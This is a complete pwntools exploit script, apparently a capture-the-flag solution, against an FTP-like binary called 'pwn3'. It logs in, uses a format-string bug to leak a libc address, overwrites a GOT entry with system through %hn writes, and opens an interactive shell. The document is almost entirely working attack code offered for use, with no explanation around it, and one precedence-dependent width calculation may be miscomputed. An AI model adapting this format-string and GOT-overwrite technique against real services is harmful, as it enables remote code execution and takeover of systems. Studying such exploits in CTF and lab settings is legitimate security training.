#!/usr/bin/python
from pwn import *
# context.log_level ='debug'
p = process('./pwn3')

def passport():
    name = "sysbdmin"
    pwd  = ''.join((chr(ord(i)-1) for i in name))
    p.recvuntil('Rainism):')
    # gdb.attach(p, "b *0x804889e")  # break at get_file
    p.sendline(pwd)
    p.recvuntil('welcome!\n')

def get(filename = None, split = "|"):
    p.recvuntil('ftp>')
    p.sendline('get')
    p.recvuntil('to get:')
    p.sendline(filename)
    return p.recv().split(split)

def put(filename = None, content = None):
    p.recvuntil('ftp>')
    p.sendline('put')
    p.recvuntil('upload:')
    p.sendline(filename)
    p.recvuntil('content:')
    p.sendline(content)

def calc(offset_func = None):
    return __libc_start_main_ret - offset___libc_start_main_ret + offset_func

offset___libc_start_main_ret = 0x19af3
offset_system = 0x00040310
offset_str_bin_sh = 0x16084c

passport()
put("/sh", "%91$08x|")
__libc_start_main_ret = int(get("/sh")[0], 16)
log.success("__libc_start_main_ret = " + hex(__libc_start_main_ret))

system = calc(offset_system)
log.success("system = " + hex(system))

fmt =  p32(0x0804A028) + p32(0x0804A028 + 2)
fmt += "%%%dc"%((system & 0xffff) - 8) + "%7$hn" 
fmt += "%%%dc"%((system >> 16 & 0xffff - ((system & 0xffff) - 8)) - 8)  + "%8$hn"
p.sendline("put")
p.sendline("/bin")
p.sendline(fmt)
#print get("/bin")
p.sendline("get")
p.sendline("/bin")
p.recv()
p.sendline("dir")

p.interactive()
